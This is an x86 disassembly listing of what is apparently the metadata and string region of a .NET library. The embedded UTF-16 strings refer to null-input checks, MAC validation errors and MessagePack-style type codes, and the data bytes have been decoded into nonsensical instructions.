  40bc74:	00 6f 00             	add    %ch,0x0(%edi)
  40bc77:	72 00                	jb     0x40bc79
  40bc79:	20 00                	and    %al,(%eax)
  40bc7b:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bc7f:	70 00                	jo     0x40bc81
  40bc81:	74 00                	je     0x40bc83
  40bc83:	79 00                	jns    0x40bc85
  40bc85:	2e 00 00             	add    %al,%cs:(%eax)
  40bc88:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bc8d:	70 00                	jo     0x40bc8f
  40bc8f:	75 00                	jne    0x40bc91
  40bc91:	74 00                	je     0x40bc93
  40bc93:	20 00                	and    %al,(%eax)
  40bc95:	63 00                	arpl   %eax,(%eax)
  40bc97:	61                   	popa
  40bc98:	00 6e 00             	add    %ch,0x0(%esi)
  40bc9b:	20 00                	and    %al,(%eax)
  40bc9d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc9e:	00 6f 00             	add    %ch,0x0(%edi)
  40bca1:	74 00                	je     0x40bca3
  40bca3:	20 00                	and    %al,(%eax)
  40bca5:	62 00                	bound  %eax,(%eax)
  40bca7:	65 00 20             	add    %ah,%gs:(%eax)
  40bcaa:	00 6e 00             	add    %ch,0x0(%esi)
  40bcad:	75 00                	jne    0x40bcaf
  40bcaf:	6c                   	insb   (%dx),%es:(%edi)
  40bcb0:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bcb4:	00 00                	add    %al,(%eax)
  40bcb6:	55                   	push   %ebp
  40bcb7:	49                   	dec    %ecx
  40bcb8:	00 6e 00             	add    %ch,0x0(%esi)
  40bcbb:	76 00                	jbe    0x40bcbd
  40bcbd:	61                   	popa
  40bcbe:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bcc2:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bcc6:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcc9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bccd:	73 00                	jae    0x40bccf
  40bccf:	61                   	popa
  40bcd0:	00 67 00             	add    %ah,0x0(%edi)
  40bcd3:	65 00 20             	add    %ah,%gs:(%eax)
  40bcd6:	00 61 00             	add    %ah,0x0(%ecx)
  40bcd9:	75 00                	jne    0x40bcdb
  40bcdb:	74 00                	je     0x40bcdd
  40bcdd:	68 00 65 00 6e       	push   $0x6e006500
  40bce2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bce6:	00 63 00             	add    %ah,0x0(%ebx)
  40bce9:	61                   	popa
  40bcea:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bcee:	00 6f 00             	add    %ch,0x0(%edi)
  40bcf1:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcf2:	00 20                	add    %ah,(%eax)
  40bcf4:	00 63 00             	add    %ah,0x0(%ebx)
  40bcf7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bcf8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bcfc:	00 20                	add    %ah,(%eax)
  40bcfe:	00 28                	add    %ch,(%eax)
  40bd00:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd03:	41                   	inc    %ecx
  40bd04:	00 43 00             	add    %al,0x0(%ebx)
  40bd07:	29 00                	sub    %eax,(%eax)
  40bd09:	2e 00 00             	add    %al,%cs:(%eax)
  40bd0c:	05 58 00 32 00       	add    $0x320058,%eax
  40bd11:	00 0f                	add    %cl,(%edi)
  40bd13:	7b 00                	jnp    0x40bd15
  40bd15:	30 00                	xor    %al,(%eax)
  40bd17:	3a 00                	cmp    (%eax),%al
  40bd19:	44                   	inc    %esp
  40bd1a:	00 33                	add    %dh,(%ebx)
  40bd1c:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd1f:	20 00                	and    %al,(%eax)
  40bd21:	00 0f                	add    %cl,(%edi)
  40bd23:	7b 00                	jnp    0x40bd25
  40bd25:	30 00                	xor    %al,(%eax)
  40bd27:	3a 00                	cmp    (%eax),%al
  40bd29:	58                   	pop    %eax
  40bd2a:	00 32                	add    %dh,(%edx)
  40bd2c:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd2f:	20 00                	and    %al,(%eax)
  40bd31:	00 2b                	add    %ch,(%ebx)
  40bd33:	28 00                	sub    %al,(%eax)
  40bd35:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd36:	00 65 00             	add    %ah,0x0(%ebp)
  40bd39:	76 00                	jbe    0x40bd3b
  40bd3b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd3f:	20 00                	and    %al,(%eax)
  40bd41:	75 00                	jne    0x40bd43
  40bd43:	73 00                	jae    0x40bd45
  40bd45:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bd4a:	00 20                	add    %ah,(%eax)
  40bd4c:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bd50:	00 70 00             	add    %dh,0x0(%eax)
  40bd53:	65 00 20             	add    %ah,%gs:(%eax)
  40bd56:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd59:	63 00                	arpl   %eax,(%eax)
  40bd5b:	31 00                	xor    %eax,(%eax)
  40bd5d:	00 45 28             	add    %al,0x28(%ebp)
  40bd60:	00 65 00             	add    %ah,0x0(%ebp)
  40bd63:	78 00                	js     0x40bd65
  40bd65:	74 00                	je     0x40bd67
  40bd67:	38 00                	cmp    %al,(%eax)
  40bd69:	2c 00                	sub    $0x0,%al
  40bd6b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd6f:	74 00                	je     0x40bd71
  40bd71:	31 00                	xor    %eax,(%eax)
  40bd73:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd77:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd7b:	33 00                	xor    (%eax),%eax
  40bd7d:	32 00                	xor    (%eax),%al
  40bd7f:	29 00                	sub    %eax,(%eax)
  40bd81:	20 00                	and    %al,(%eax)
  40bd83:	74 00                	je     0x40bd85
  40bd85:	79 00                	jns    0x40bd87
  40bd87:	70 00                	jo     0x40bd89
  40bd89:	65 00 20             	add    %ah,%gs:(%eax)
  40bd8c:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd8f:	63 00                	arpl   %eax,(%eax)
  40bd91:	37                   	aaa
  40bd92:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bd95:	24 00                	and    $0x0,%al
  40bd97:	63 00                	arpl   %eax,(%eax)
  40bd99:	38 00                	cmp    %al,(%eax)
  40bd9b:	2c 00                	sub    $0x0,%al
  40bd9d:	24 00                	and    $0x0,%al
  40bd9f:	63 00                	arpl   %eax,(%eax)
  40bda1:	39 00                	cmp    %eax,(%eax)
  40bda3:	00 14 74             	add    %dl,(%esp,%esi,2)
  40bda6:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40bdaa:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40bdad:	24 f5                	and    $0xf5,%al
  40bdaf:	ac                   	lods   %ds:(%esi),%al
  40bdb0:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40bdb7:	7a 5c                	jp     0x40be15
  40bdb9:	56                   	push   %esi
  40bdba:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bdbd:	89 03                	mov    %eax,(%ebx)
  40bdbf:	00 00                	add    %al,(%eax)
  40bdc1:	01 03                	add    %eax,(%ebx)
  40bdc3:	20 00                	and    %al,(%eax)
  40bdc5:	01 02                	add    %eax,(%edx)
  40bdc7:	06                   	push   %es
  40bdc8:	0e                   	push   %cs
  40bdc9:	03 06                	add    (%esi),%eax
  40bdcb:	12 09                	adc    (%ecx),%cl
  40bdcd:	03 06                	add    (%esi),%eax
  40bdcf:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bdd3:	00 02                	add    %al,(%edx)
  40bdd5:	03 06                	add    (%esi),%eax
  40bdd7:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bddd:	03 06                	add    (%esi),%eax
  40bddf:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40bde4:	03 06                	add    (%esi),%eax
  40bde6:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40bdec:	06                   	push   %es
  40bded:	1c 02                	sbb    $0x2,%al
  40bdef:	06                   	push   %es
  40bdf0:	08 04 00             	or     %al,(%eax,%eax,1)
  40bdf3:	00 12                	add    %dl,(%edx)
  40bdf5:	0d 05 00 01 01       	or     $0x1010005,%eax
  40bdfa:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40be00:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be06:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be09:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be0f:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be15:	0a 04 00             	or     (%eax,%eax,1),%al
  40be18:	01 01                	add    %eax,(%ecx)
  40be1a:	0a 04 00             	or     (%eax,%eax,1),%al
  40be1d:	00 12                	add    %dl,(%edx)
  40be1f:	15 05 00 01 01       	adc    $0x1010005,%eax
  40be24:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40be2a:	02 03                	add    (%ebx),%al
  40be2c:	00 00                	add    %al,(%eax)
  40be2e:	1c 03                	sbb    $0x3,%al
  40be30:	00 00                	add    %al,(%eax)
  40be32:	08 04 00             	or     %al,(%eax,%eax,1)
  40be35:	01 01                	add    %eax,(%ecx)
  40be37:	08 04 00             	or     %al,(%eax,%eax,1)
  40be3a:	01 02                	add    %eax,(%edx)
  40be3c:	0e                   	push   %cs
  40be3d:	0a 00                	or     (%eax),%al
  40be3f:	04 02                	add    $0x2,%al
  40be41:	1c 12                	sbb    $0x12,%al
  40be43:	19 12                	sbb    %edx,(%edx)
  40be45:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40be4a:	01 01                	add    %eax,(%ecx)
  40be4c:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be52:	1c 04                	sbb    $0x4,%al
  40be54:	08 00                	or     %al,(%eax)
  40be56:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be5c:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be5f:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be65:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be68:	00 12                	add    %dl,(%edx)
  40be6a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be6f:	03 08                	add    (%eax),%ecx
  40be71:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be74:	08 00                	or     %al,(%eax)
  40be76:	08 03                	or     %al,(%ebx)
  40be78:	00 00                	add    %al,(%eax)
  40be7a:	0e                   	push   %cs
  40be7b:	04 00                	add    $0x0,%al
  40be7d:	01 0e                	add    %ecx,(%esi)
  40be7f:	0e                   	push   %cs
  40be80:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40be86:	d5 0a                	aad    $0xa
  40be88:	3a 06                	cmp    (%esi),%al
  40be8a:	00 01                	add    %al,(%ecx)
  40be8c:	12 29                	adc    (%ecx),%ch
  40be8e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40be94:	03 00                	add    (%eax),%eax
  40be96:	00 18                	add    %bl,(%eax)
  40be98:	07                   	pop    %es
  40be99:	00 03                	add    %al,(%ebx)
  40be9b:	08 18                	or     %bl,(%eax)
  40be9d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40bea3:	18 0e                	sbb    %cl,(%esi)
  40bea5:	06                   	push   %es
  40bea6:	00 02                	add    %al,(%edx)
  40bea8:	02 18                	add    (%eax),%bl
  40beaa:	10 02                	adc    %al,(%edx)
  40beac:	06                   	push   %es
  40bead:	00 01                	add    %al,(%ecx)
  40beaf:	11 30                	adc    %esi,(%eax)
  40beb1:	11 30                	adc    %esi,(%eax)
  40beb3:	06                   	push   %es
  40beb4:	00 03                	add    %al,(%ebx)
  40beb6:	01 09                	add    %ecx,(%ecx)
  40beb8:	09 09                	or     %ecx,(%ecx)
  40beba:	02 06                	add    (%esi),%al
  40bebc:	09 03                	or     %eax,(%ebx)
  40bebe:	06                   	push   %es
  40bebf:	11 30                	adc    %esi,(%eax)
  40bec1:	04 00                	add    $0x0,%al
  40bec3:	00 00                	add    %al,(%eax)
  40bec5:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bec9:	00 00                	add    %al,(%eax)
  40becb:	04 01                	add    $0x1,%al
  40becd:	00 00                	add    %al,(%eax)
  40becf:	00 06                	add    %al,(%esi)
  40bed1:	00 02                	add    %al,(%edx)
  40bed3:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bed6:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bedb:	0e                   	push   %cs
  40bedc:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bee1:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40bee6:	15 12 41 01 12       	adc    $0x12014112,%eax
  40beeb:	60                   	pusha
  40beec:	05 00 01 01 12       	add    $0x12010100,%eax
  40bef1:	60                   	pusha
  40bef2:	04 00                	add    $0x0,%al
  40bef4:	01 01                	add    %eax,(%ecx)
  40bef6:	0e                   	push   %cs
  40bef7:	18 06                	sbb    %al,(%esi)
  40bef9:	15 12 45 01 15       	adc    $0x15014512,%eax
  40befe:	12 49 0a             	adc    0xa(%ecx),%cl
  40bf01:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf04:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf0a:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf0f:	0e                   	push   %cs
  40bf10:	04 20                	add    $0x20,%al
  40bf12:	00 00                	add    %al,(%eax)
  40bf14:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf17:	00 00                	add    %al,(%eax)
  40bf19:	00 04 10             	add    %al,(%eax,%edx,1)
  40bf1c:	00 00                	add    %al,(%eax)
  40bf1e:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bf21:	01 01                	add    %eax,(%ecx)
  40bf23:	0e                   	push   %cs
  40bf24:	04 20                	add    $0x20,%al
  40bf26:	01 0e                	add    %ecx,(%esi)
  40bf28:	0e                   	push   %cs
  40bf29:	06                   	push   %es
  40bf2a:	20 01                	and    %al,(%ecx)
  40bf2c:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bf31:	20 02                	and    %al,(%edx)
  40bf33:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf39:	00 01                	add    %al,(%ecx)
  40bf3b:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bf40:	06                   	push   %es
  40bf41:	11 50 03             	adc    %edx,0x3(%eax)
  40bf44:	06                   	push   %es
  40bf45:	12 55 05             	adc    0x5(%ebp),%dl
  40bf48:	00 01                	add    %al,(%ecx)
  40bf4a:	0e                   	push   %cs
  40bf4b:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf50:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf55:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf5b:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf61:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf67:	01 01                	add    %eax,(%ecx)
  40bf69:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf6e:	60                   	pusha
  40bf6f:	03 20                	add    (%eax),%esp
  40bf71:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf74:	20 00                	and    %al,(%eax)
  40bf76:	02 03                	add    (%ebx),%al
  40bf78:	28 00                	sub    %al,(%eax)
  40bf7a:	1c 03                	sbb    $0x3,%al
  40bf7c:	06                   	push   %es
  40bf7d:	12 60 0b             	adc    0xb(%eax),%ah
  40bf80:	20 02                	and    %al,(%edx)
  40bf82:	01 12                	add    %edx,(%edx)
  40bf84:	60                   	pusha
  40bf85:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf8a:	60                   	pusha
  40bf8b:	04 20                	add    $0x20,%al
  40bf8d:	00 12                	add    %dl,(%edx)
  40bf8f:	60                   	pusha
  40bf90:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf95:	0e                   	push   %cs
  40bf96:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf9b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bfa1:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bfa6:	60                   	pusha
  40bfa7:	08 03                	or     %al,(%ebx)
  40bfa9:	20 00                	and    %al,(%eax)
  40bfab:	08 05 28 01 12 60    	or     %al,0x60120128
  40bfb1:	08 03                	or     %al,(%ebx)
  40bfb3:	28 00                	sub    %al,(%eax)
  40bfb5:	08 03                	or     %al,(%ebx)
  40bfb7:	06                   	push   %es
  40bfb8:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bfbc:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bfc0:	01 08                	add    %ecx,(%eax)
  40bfc2:	0e                   	push   %cs
  40bfc3:	05 20 01 01 12       	add    $0x12010120,%eax
  40bfc8:	61                   	popa
  40bfc9:	04 20                	add    $0x20,%al
  40bfcb:	01 01                	add    %eax,(%ecx)
  40bfcd:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bfd0:	01 01                	add    %eax,(%ecx)
  40bfd2:	0b 03                	or     (%ebx),%eax
  40bfd4:	20 00                	and    %al,(%eax)
  40bfd6:	0b 03                	or     (%ebx),%eax
  40bfd8:	20 00                	and    %al,(%eax)
  40bfda:	0a 03                	or     (%ebx),%al
  40bfdc:	20 00                	and    %al,(%eax)
  40bfde:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bfe3:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40bfe8:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40bfed:	01 0e                	add    %ecx,(%esi)
  40bfef:	0e                   	push   %cs
  40bff0:	05 20 02 01 0e       	add    $0xe010220,%eax
  40bff5:	08 04 20             	or     %al,(%eax,%eiz,1)
  40bff8:	01 02                	add    %eax,(%edx)
  40bffa:	0e                   	push   %cs
  40bffb:	03 20                	add    (%eax),%esp
  40bffd:	00 0e                	add    %cl,(%esi)
  40bfff:	04 20                	add    $0x20,%al
  40c001:	01 01                	add    %eax,(%ecx)
  40c003:	02 04 20             	add    (%eax,%eiz,1),%al
  40c006:	01 01                	add    %eax,(%ecx)
  40c008:	0c 04                	or     $0x4,%al
  40c00a:	20 01                	and    %al,(%ecx)
  40c00c:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c012:	5c                   	pop    %esp
  40c013:	04 20                	add    $0x20,%al
  40c015:	00 11                	add    %dl,(%ecx)
  40c017:	64 04 20             	fs add $0x20,%al
  40c01a:	00 12                	add    %dl,(%edx)
  40c01c:	59                   	pop    %ecx
  40c01d:	03 28                	add    (%eax),%ebp
  40c01f:	00 0e                	add    %cl,(%esi)
  40c021:	03 28                	add    (%eax),%ebp
  40c023:	00 0a                	add    %cl,(%edx)
  40c025:	03 28                	add    (%eax),%ebp
  40c027:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c02d:	5c                   	pop    %esp
  40c02e:	04 28                	add    $0x28,%al
  40c030:	00 11                	add    %dl,(%ecx)
  40c032:	64 04 00             	fs add $0x0,%al
  40c035:	00 00                	add    %al,(%eax)
  40c037:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c03a:	00 00                	add    %al,(%eax)
  40c03c:	00 04 04             	add    %al,(%esp,%eax,1)
  40c03f:	00 00                	add    %al,(%eax)
  40c041:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c048:	06                   	push   %es
  40c049:	00 00                	add    %al,(%eax)
  40c04b:	00 04 07             	add    %al,(%edi,%eax,1)
  40c04e:	00 00                	add    %al,(%eax)
  40c050:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c053:	00 00                	add    %al,(%eax)
  40c055:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c058:	00 00                	add    %al,(%eax)
  40c05a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c05d:	00 00                	add    %al,(%eax)
  40c05f:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c062:	00 00                	add    %al,(%eax)
  40c064:	00 06                	add    %al,(%esi)
  40c066:	00 02                	add    %al,(%edx)
  40c068:	0e                   	push   %cs
  40c069:	12 61 08             	adc    0x8(%ecx),%ah
  40c06c:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c071:	61                   	popa
  40c072:	06                   	push   %es
  40c073:	00 02                	add    %al,(%edx)
  40c075:	0e                   	push   %cs
  40c076:	05 12 61 05 00       	add    $0x56112,%eax
  40c07b:	01 01                	add    %eax,(%ecx)
  40c07d:	12 61 06             	adc    0x6(%ecx),%ah
  40c080:	00 02                	add    %al,(%edx)
  40c082:	01 12                	add    %edx,(%edx)
  40c084:	61                   	popa
  40c085:	0e                   	push   %cs
  40c086:	07                   	pop    %es
  40c087:	00 02                	add    %al,(%edx)
  40c089:	01 12                	add    %edx,(%edx)
  40c08b:	61                   	popa
  40c08c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c091:	01 12                	add    %edx,(%edx)
  40c093:	61                   	popa
  40c094:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c099:	12 61 0c             	adc    0xc(%ecx),%ah
  40c09c:	06                   	push   %es
  40c09d:	00 02                	add    %al,(%edx)
  40c09f:	01 12                	add    %edx,(%edx)
  40c0a1:	61                   	popa
  40c0a2:	02 06                	add    (%esi),%al
  40c0a4:	00 02                	add    %al,(%edx)
  40c0a6:	01 12                	add    %edx,(%edx)
  40c0a8:	61                   	popa
  40c0a9:	0b 06                	or     (%esi),%eax
  40c0ab:	00 02                	add    %al,(%edx)
  40c0ad:	01 12                	add    %edx,(%edx)
  40c0af:	61                   	popa
  40c0b0:	0a 03                	or     (%ebx),%al
  40c0b2:	06                   	push   %es
  40c0b3:	11 78 04             	adc    %edi,0x4(%eax)
  40c0b6:	20 01                	and    %al,(%ecx)
  40c0b8:	01 08                	add    %ecx,(%eax)
  40c0ba:	08 01                	or     %al,(%ecx)
  40c0bc:	00 08                	add    %cl,(%eax)
  40c0be:	00 00                	add    %al,(%eax)
  40c0c0:	00 00                	add    %al,(%eax)
  40c0c2:	00 1e                	add    %bl,(%esi)
  40c0c4:	01 00                	add    %eax,(%eax)
  40c0c6:	01 00                	add    %eax,(%eax)
  40c0c8:	54                   	push   %esp
  40c0c9:	02 16                	add    (%esi),%dl
  40c0cb:	57                   	push   %edi
  40c0cc:	72 61                	jb     0x40c12f
  40c0ce:	70 4e                	jo     0x40c11e
  40c0d0:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0d2:	45                   	inc    %ebp
  40c0d3:	78 63                	js     0x40c138
  40c0d5:	65 70 74             	gs jo  0x40c14c
  40c0d8:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c0df:	77 73                	ja     0x40c154
  40c0e1:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c0e7:	71 08                	jno    0x40c0f1
  40c0e9:	01 00                	add    %eax,(%eax)
  40c0eb:	02 00                	add    (%eax),%al
  40c0ed:	00 00                	add    %al,(%eax)
  40c0ef:	00 00                	add    %al,(%eax)
  40c0f1:	05 01 00 00 00       	add    $0x1,%eax
  40c0f6:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c0f9:	00 07                	add    %al,(%edi)
  40c0fb:	31 2e                	xor    %ebp,(%esi)
  40c0fd:	30 2e                	xor    %ch,(%esi)
  40c0ff:	30 2e                	xor    %ch,(%esi)
  40c101:	30 00                	xor    %al,(%eax)
  40c103:	00 65 01             	add    %ah,0x1(%ebp)
  40c106:	00 29                	add    %ch,(%ecx)
  40c108:	2e 4e                	cs dec %esi
  40c10a:	45                   	inc    %ebp
  40c10b:	54                   	push   %esp
  40c10c:	46                   	inc    %esi
  40c10d:	72 61                	jb     0x40c170
  40c10f:	6d                   	insl   (%dx),%es:(%edi)
  40c110:	65 77 6f             	gs ja  0x40c182
  40c113:	72 6b                	jb     0x40c180
  40c115:	2c 56                	sub    $0x56,%al
  40c117:	65 72 73             	gs jb  0x40c18d
  40c11a:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c121:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c124:	72 6f                	jb     0x40c195
  40c126:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c12d:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c134:	0e                   	push   %cs
  40c135:	14 46                	adc    $0x46,%al
  40c137:	72 61                	jb     0x40c19a
  40c139:	6d                   	insl   (%dx),%es:(%edi)
  40c13a:	65 77 6f             	gs ja  0x40c1ac
  40c13d:	72 6b                	jb     0x40c1aa
  40c13f:	44                   	inc    %esp
  40c140:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c147:	61                   	popa
  40c148:	6d                   	insl   (%dx),%es:(%edi)
  40c149:	65 1f                	gs pop %ds
  40c14b:	2e 4e                	cs dec %esi
  40c14d:	45                   	inc    %ebp
  40c14e:	54                   	push   %esp
  40c14f:	20 46 72             	and    %al,0x72(%esi)
  40c152:	61                   	popa
  40c153:	6d                   	insl   (%dx),%es:(%edi)
  40c154:	65 77 6f             	gs ja  0x40c1c6
  40c157:	72 6b                	jb     0x40c1c4
  40c159:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c15c:	43                   	inc    %ebx
  40c15d:	6c                   	insb   (%dx),%es:(%edi)
  40c15e:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c165:	6f                   	outsl  %ds:(%esi),(%dx)
  40c166:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c16d:	04 49                	add    $0x49,%al
  40c16f:	74 65                	je     0x40c1d6
  40c171:	6d                   	insl   (%dx),%es:(%edi)
  40c172:	00 00                	add    %al,(%eax)
  40c174:	03 07                	add    (%edi),%eax
  40c176:	01 08                	add    %ecx,(%eax)
  40c178:	04 00                	add    $0x0,%al
  40c17a:	01 08                	add    %ecx,(%eax)
  40c17c:	0e                   	push   %cs
  40c17d:	03 07                	add    (%edi),%eax
  40c17f:	01 02                	add    %eax,(%edx)
  40c181:	05 00 00 12 80       	add    $0x80120000,%eax
  40c186:	b1 05                	mov    $0x5,%cl
  40c188:	20 01                	and    %al,(%ecx)
  40c18a:	0e                   	push   %cs
  40c18b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c190:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c196:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c19c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c1a1:	03 02                	add    (%edx),%eax
  40c1a3:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c1a8:	14 07                	adc    $0x7,%al
  40c1aa:	08 0e                	or     %cl,(%esi)
  40c1ac:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c1b2:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c1b8:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c1be:	20 03                	and    %al,(%ebx)
  40c1c0:	01 11                	add    %edx,(%ecx)
  40c1c2:	80 d5 11             	adc    $0x11,%ch
  40c1c5:	80 d9 11             	sbb    $0x11,%cl
  40c1c8:	80 dd 05             	sbb    $0x5,%ch
  40c1cb:	00 02                	add    %al,(%edx)
  40c1cd:	02 0e                	add    (%esi),%cl
  40c1cf:	0e                   	push   %cs
  40c1d0:	06                   	push   %es
  40c1d1:	20 01                	and    %al,(%ecx)
  40c1d3:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c1d8:	20 01                	and    %al,(%ecx)
  40c1da:	08 08                	or     %cl,(%eax)
  40c1dc:	07                   	pop    %es
  40c1dd:	00 01                	add    %al,(%ecx)
  40c1df:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c1e4:	07                   	pop    %es
  40c1e5:	20 02                	and    %al,(%edx)
  40c1e7:	01 12                	add    %edx,(%edx)
  40c1e9:	80 c9 08             	or     $0x8,%cl
  40c1ec:	06                   	push   %es
  40c1ed:	20 01                	and    %al,(%ecx)
  40c1ef:	01 12                	add    %edx,(%edx)
  40c1f1:	80 f1 09             	xor    $0x9,%cl
  40c1f4:	20 02                	and    %al,(%edx)
  40c1f6:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c1fb:	80 f5 05             	xor    $0x5,%ch
  40c1fe:	20 02                	and    %al,(%edx)
  40c200:	08 08                	or     %cl,(%eax)
  40c202:	08 06                	or     %al,(%esi)
  40c204:	20 02                	and    %al,(%edx)
  40c206:	01 12                	add    %edx,(%edx)
  40c208:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c20d:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c210:	09 20                	or     %esp,(%eax)
  40c212:	03 01                	add    (%ecx),%eax
  40c214:	12 61 02             	adc    0x2(%ecx),%ah
  40c217:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c21d:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c223:	01 0e                	add    %ecx,(%esi)
  40c225:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c22b:	02 09                	add    (%ecx),%cl
  40c22d:	20 04 01             	and    %al,(%ecx,%eax,1)
